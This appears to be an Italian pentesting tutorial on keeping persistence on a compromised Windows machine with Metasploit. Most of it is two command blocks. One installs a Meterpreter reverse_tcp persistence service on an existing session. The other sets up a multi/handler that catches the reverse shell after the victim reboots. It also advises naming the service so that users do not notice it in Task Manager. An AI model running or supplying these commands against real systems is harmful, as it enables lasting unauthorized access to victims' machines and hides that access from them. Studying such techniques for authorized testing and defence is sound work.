# Mantenere la persistenza su un sistema Windows
La persistenza consiste in una serie di tecniche che degli aggressori utilizzano per mantenere l'accesso ai sistemi dopo essere stati riavvaiti, dopo che la vittima ha cambiato le credenziali o altre azioni che potrebbero interrompere l'accesso ad un attaccante. <br>

## modulo persistance service
dopo aver ottenuto l'accesso a un target tramite una sessione meterpreter, possiamo usare un modulo per poter mantenere l'accesso sul sistema anche quando viene riavviato.
```bash
use exploit/windows/local/persistance_service
set payload windows/meterpreter/reverse_tcp
set REMOTE_EXE_NAME <nome>                         # impostiamo un nome al sitema target su cui vogliamo mantenere l'accesso
set REMOTE_EXE_PATH                                # impostiamo il path dove si dovrá trovare il nostro servizio di persistenza
set SERVICE_NAME <name>
set SESSION 1
set LPORT <PORT>                                   # impostiamo una porta diversa da quella usata per meterpreter
#questa porta verrá usata per riprendere l'accesso
run
```
> impostiamo un `SERVICE_NAME` con un nome piú legittimo possibile perché gli utenti potrebbero essere in grado di rilevare il servizio di persistenza dal Task Manager.

## acesso 
dopo aver eseguito il modulo, per poter accedere al sistema usiamo un multi handler
```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp       # stesso payload usato nel modulo di persistenza
set LHOST <IP>
set LPORT <PORT>  	                              # stessa porta usasta nel modulo di persistenza
run
```
subito dopo aver eseguito il multi handler, verremo immediatamente portati in una sessione meterpreter perché sul target é in continua esecuzione il modulo di persistenza anche quando viene riavviato il sistema del target.

---
